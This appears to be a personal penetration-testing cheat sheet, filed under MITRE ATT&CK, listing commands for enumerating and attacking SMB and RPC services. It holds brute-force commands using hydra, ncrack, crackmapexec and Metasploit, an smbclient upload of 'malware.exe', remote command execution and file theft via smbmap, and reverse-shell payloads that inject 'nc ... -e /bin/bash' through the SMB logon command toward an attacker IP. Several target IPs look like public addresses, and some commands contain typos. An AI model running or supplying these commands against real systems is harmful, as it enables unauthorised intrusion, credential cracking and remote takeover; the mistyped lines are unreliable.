[[content/Mitre Attack/Reconnaissance TA0043/ENUMERATION]]

Description:
- port of smb 445,139,135 is on tcp
- port 138,137 is on UDP

Nmap script : 
	`~# smb-enum-shares // Enumerates SMB shares in an SMB server.
	`~# smb-os-discovery // os discovery 
	`~# smb-brute  // Performs brute-force password auditing against SMB servers.
	`~# smb-system-info   // Collects system information through SMB/NetBios.
	`~# smb-vuln-smb/cve* // Identifies whether the SMB server is vulnerable to any known exploits.
	`~# nmap --script=smb-enum*,smb-vuln* 10.10.10.102 -p 139,445 -Pn -n --disable-arp-ping

SMB Enum
---------------------------------------------------------------------------------------------- 
SMBClient
	`~# smbclient -L //49.231.219.113 -U "username" --password "" -m SMB2 // list
	`~# smbclient //49.231.219.113/Micros -U "username"  --password "" -m SMB2 // login  
	`~# smbclient //49.231.219.113/Micros -U "username"  --password "" -c 'put malware.exe' -m SMB2
	`~# smbclient -N 172.20.10.1 -L // null request
Enum4Linux:
	`~# enum4linux -a 172.20.10.1 | tee enum4linux.log
	`~# enum4linux -a | -U | -G | -S | -r -u -p
SMBEagle:
	`~# smbeagle -c results.csv -n 192.168.1.0/24 -u ksmith -p Password123 -q
SMBMap:
	`~# smbmap -H 172.20.10.1
	`~# smbmap -H 172.20.10.1 -u  -p  
	`~# smbmap -H 172.20.10.1 -u  -p  -x 'ipconfig' | -L mapdrive show | --download 'C$\flag.txt'  | --upload /home/adolf 'C$\smd'
	`~# smbmap -H 172.20.10.1 -s sharename
NMBLookUp:
`~# nmblookup -A 49.231.219.113
NBTscan:
	`~# nbtscan -r 172.20.10.0/24/
RPC ENUM
-----------------------------------------------------------------------------------------------
`~# rpcclient -U "" 192.168.1.15445,139,135  -N  // enum
`~# rpcclient -U ""  --password "" 49.231.219.113 //login common
>`enumdomusers
>`enumdomgroups
>`srvinfo   // Windows version
>`enumalsgroups domain or bulitin
>`lsaenumsid
>`lookupnames
>`lookupsids
>`queryuser [rid]
>`getdompwinfo
>`getusrdompwinfo [rid]

Brute Fource
-----------------------------------------------------------------------------------------------
CrackMapExec:
	`~# crackmapexec smb 172.20.10.1 -u ' ' -p ' ' --share <Share name>
	`~# crackmapexec smb 94.182.182.2 -u -p --share IPC$
Ncrack:
	`~# ncrack -T 5 172.20.10.1 -p smb -v -u <Username> -P /usr/rockyou.txt
Hydra:
	`~# hydra -t 4 -l/L admin admin.txt -p/P -t 4 1234/pass.txt IP smb
MSFconsole:
	`msfconsole -q
		 `msf6 > search type:auxiliary smb_login 
		 `msf6 > use auxilliary/scanner/smb/smb_login
		 
https://attack.mitre.org/techniques/T1110

-----------------------------------------------------------------------------------------------
`~# mount -t cifs "//172.20.10.1/share/" /mnt/wins
`~# mount -t cifs "//172.20.10.1/share/" /mnt/wins -o vers=1.0,user=root,uid=0,gid=0

-----------------------------------------------------------------------------------------------
SMB shell to get a reverse shell
`~# smbclient -U "username" //I172.20.10.1/sharename --password " "
`~# smbclient -U "username%password" //<IP>/share_name         After successful login,
`smb> logon "/=nc'attack box IP' 4444 -e /bin/bash"
`smb> logon "/='nohup nc -nv 10.10.14.6 4444 -e /bin/sh'"
Mitre map
-----------------------------------------------------------------------------------------------
Network Share Discovery: https://attack.mitre.org/techniques/T1135
Windows Admin Shares: https://attack.mitre.org/techniques/T1077
Brute Force: https://attack.mitre.org/techniques/T1110
